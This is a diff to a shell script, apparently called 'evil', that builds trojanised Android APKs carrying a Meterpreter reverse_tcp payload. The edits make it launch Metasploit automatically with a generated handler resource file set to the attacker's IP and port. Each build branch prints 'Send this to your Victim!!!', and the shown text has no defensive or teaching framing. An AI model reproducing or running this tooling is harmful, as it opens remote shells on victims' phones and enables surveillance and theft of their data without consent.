@@ -180,7 +180,7 @@ do
             printf "${BBlue}"
             cowsay "Done Building App"
             printf "${none}"
-            printf "\n${BR}#drag this file after openning 'Metasploit-Framework'${none}\n"
+            printf "\n${BR}#Making autometasploit.rc${none}\n"
             echo "use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set lhost $ip
@@ -191,7 +191,7 @@ apk: $apk
 ip: $ip
 port: $port
 " > infected.apk/lastexecute.txt
-            printf "${p}After Openning Metasploit-Framework, type 'resourse ' and drag autometasploit.rc file${none}\n"
+            printf "${p}All Done!!!${none}\n"
             printf "\n${BG}Done Building App. Send this to your Victim!!!${none}"
             printf "\n${BG}OK${none}"
             printf "\n${BG}OK${none}"
@@ -225,7 +225,7 @@ port: $port
             printf "${BBlue}"
             cowsay "Done Building App"
             printf "${none}"
-            printf "\n${BR}#drag this file after openning 'Metasploit-Framework'${none}\n"
+            printf "\n${BR}#Making autometasploit.rc${none}\n"
             echo "use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set lhost $ip
@@ -236,7 +236,7 @@ apk: $apk
 ip: $ip
 port: $port
 " > infected.apk/lastexecute.txt
-            printf "${p}After Openning Metasploit-Framework, type 'resourse ' and drag autometasploit.rc file${none}\n"
+            printf "${p}All Done!!!${none}\n"
             printf "\n${BG}Done Building App. Send this to your Victim!!!${none}"
             printf "\n${BG}OK${none}"
             printf "\n${BG}OK${none}"
@@ -270,7 +270,7 @@ port: $port
             printf "${BBlue}"
             cowsay "Done Building App"
             printf "${none}"
-            printf "\n${BR}#drag this file after openning 'Metasploit-Framework'${none}\n"
+            printf "\n${BR}#Making autometasploit.rc${none}\n"
             echo "use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set lhost $ip
@@ -281,7 +281,7 @@ apk: $apk
 ip: $ip
 port: $port
 " > infected.apk/lastexecute.txt
-            printf "${p}After Openning Metasploit-Framework, type 'resourse ' and drag autometasploit.rc file${none}\n"
+            printf "${p}All Done!!!${none}\n"
             printf "\n${BG}Done Building App. Send this to your Victim!!!${none}"
             printf "\n${BG}OK${none}"
             printf "\n${BG}OK${none}"
@@ -326,7 +326,7 @@ do
     case $opt in
         "m")
             printf "${BG}Starting Metasploit!!!"
-            msfconsole
+            msfconsole -r autometasploit.rc
             break
             ;;
         "c")
@@ -342,7 +342,7 @@ do
             break
             ;;
         "s")
-            printf "${BG}Starting Evil-Application again!"
+            printf "${BG}Starting Evil-Application!"
             sleep 3
             sudo ./evil
             ;;
